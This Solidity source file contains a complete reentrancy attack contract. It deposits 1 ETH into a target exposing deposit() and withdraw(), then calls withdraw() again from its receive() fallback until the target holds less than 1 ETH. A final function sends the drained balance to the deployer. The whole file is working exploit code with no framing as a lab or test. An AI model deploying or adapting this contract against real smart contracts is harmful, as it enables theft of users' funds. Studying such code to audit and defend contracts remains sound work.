// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {

    IVulnerable public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerable(_target);
        owner = msg.sender;
    }

    function attack() public payable {

        require(msg.value >= 1 ether, "Need 1 ETH");

        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    receive() external payable {

        if(address(target).balance >= 1 ether){
            target.withdraw();
        }
    }

    function withdrawFunds() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}